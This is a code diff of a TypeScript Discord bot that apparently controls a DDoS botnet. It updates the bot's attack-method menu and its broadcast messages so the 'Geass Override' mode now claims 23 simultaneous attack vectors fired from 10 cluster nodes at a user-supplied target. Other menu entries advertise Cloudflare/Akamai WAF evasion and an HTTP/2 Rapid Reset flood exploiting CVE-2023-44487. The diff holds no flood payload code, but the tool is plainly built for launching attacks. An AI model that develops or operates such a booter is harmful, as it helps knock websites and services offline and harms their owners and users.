@@ -51,7 +51,7 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 21v]",    description: "MAX POWER — 21 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+UDP+RUDY2+Cache+TLS+QUIC+SSL+H2Storm+Pipeline+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 23v]",    description: "MAX POWER — 23 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+UDP+RUDY2+Cache+TLS+QUIC+SSL+H2Storm+Pipeline+HTTPBypass+SYN+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -713,7 +713,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
           .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
           .setDescription(
             `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
-            `🌐 Broadcasting **ARES OMNIVECT** to **all cluster nodes** — 21 vectors × 10 machines`
+            `🌐 Broadcasting **ARES OMNIVECT** to **all cluster nodes** — 23 vectors × 10 machines`
           )
           .addFields(
             { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
@@ -740,7 +740,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
             .setColor(COLORS.CRIMSON)
             .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
             .setDescription(
-              `👁️ **ARES OMNIVECT × ${nodesOnline}** — All cluster nodes running 21 simultaneous attack vectors\n\n` +
+              `👁️ **ARES OMNIVECT × ${nodesOnline}** — All cluster nodes running 23 simultaneous attack vectors\n\n` +
               `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
             )
             .setImage("attachment://lelouch.gif")
